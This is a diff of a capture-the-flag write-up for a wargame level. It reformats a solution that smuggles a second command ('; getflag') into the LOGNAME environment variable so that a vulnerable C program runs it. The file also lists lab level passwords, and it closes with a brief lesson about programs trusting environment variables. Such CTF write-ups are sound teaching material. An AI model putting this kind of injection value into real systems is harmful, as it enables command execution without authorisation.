@@ -22,11 +22,13 @@ pass : wiok45aaoguiboiki2tuin6ub
     - ```export LOGNAME="; getflag"```
 
 ## Solution
-- ```export LOGNAME="; getflag"```
-- ```./level07```
+```bash
+export LOGNAME="; getflag"
+./level07
+```
 
-no flag
-level08 : fiumuikeil55xe9cu4dood66h
+- no flag
+- level08 : fiumuikeil55xe9cu4dood66h
 
 ## Resolve problem
 - be carefull when c program use env var
